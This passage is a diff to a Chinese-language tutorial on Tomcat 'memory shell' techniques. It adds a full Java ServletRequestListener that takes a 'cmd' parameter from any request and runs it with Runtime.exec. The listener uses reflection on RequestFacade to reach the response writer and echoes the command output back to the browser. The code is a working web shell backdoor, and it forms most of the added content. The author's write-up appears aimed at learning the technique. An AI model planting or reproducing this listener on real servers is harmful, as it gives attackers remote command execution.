@@ -94,13 +94,61 @@ ok这里的request是 Request类的我们去看看
 在这里我们可以看到，这里就是包含我们请求也就是 `Request+Response`
 ![](picture/Pasted%20image%2020260106000817.png)
 
-ok，那我们直接反射获取 `RequestFacade`的那个request属性，就能拿到存放我们请求的对象了。
+ok，那我们直接反射获取 `RequestFacade`的那个request属性，就能拿到存放我们请求和回复的对象 Response了。
 
-
-
-
-
-
+```java
+package demo.tomcat;  
+  
+import javax.servlet.ServletRequest;  
+import javax.servlet.ServletRequestEvent;  
+import javax.servlet.ServletRequestListener;  
+import java.io.InputStream;  
+import java.lang.reflect.Field;  
+import java.lang.reflect.Method;  
+  
+public class SerVlertListener implements ServletRequestListener {  
+    public SerVlertListener() {  
+        super();  
+    }  
+  
+    @Override  
+    public void requestDestroyed(ServletRequestEvent sre) {  
+  
+    }  
+  
+    @Override  
+    public void requestInitialized(ServletRequestEvent sre) {  
+        String cmd = sre.getServletRequest().getParameter("cmd");//拿到传参  
+        ServletRequest requestfacade = sre.getServletRequest();//拿到requestfacade类  
+        try {  
+            Field requestField = requestfacade.getClass().getDeclaredField("request");  
+            requestField.setAccessible(true);  
+            Object ObjectRequest = requestField.get(requestfacade);//拿到存放请求内容的对象  
+  
+            Method getResponseMethod = ObjectRequest.getClass().getMethod("getResponse");//拿其中的回复对象，为了回显  
+            Object ObjectResponse = getResponseMethod.invoke(ObjectRequest);  
+            //再获取ObjectResponse的 Writer 以便写出数据  
+            java.io.PrintWriter writer = (java.io.PrintWriter) ObjectResponse.getClass().getMethod("getWriter").invoke(ObjectResponse);  
+            //命令执行  
+            if (cmd != null) {  
+                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();  
+                java.util.Scanner s = new java.util.Scanner(inputStream).useDelimiter("\\A");  
+                String output = s.hasNext() ? s.next() : "";  
+                // 6. 使用我们“偷”出来的 writer 将结果写回浏览器  
+                writer.write(output);  
+                writer.flush();  
+            }  
+  
+        } catch (Exception e) {  
+            throw new RuntimeException(e);  
+        }  
+  
+    }  
+}
+```
+![](picture/Pasted%20image%2020260106004603.png)
+呼~完美。
+## Tomcat 中的 Listener 是如何实现注册的？
 
 
 
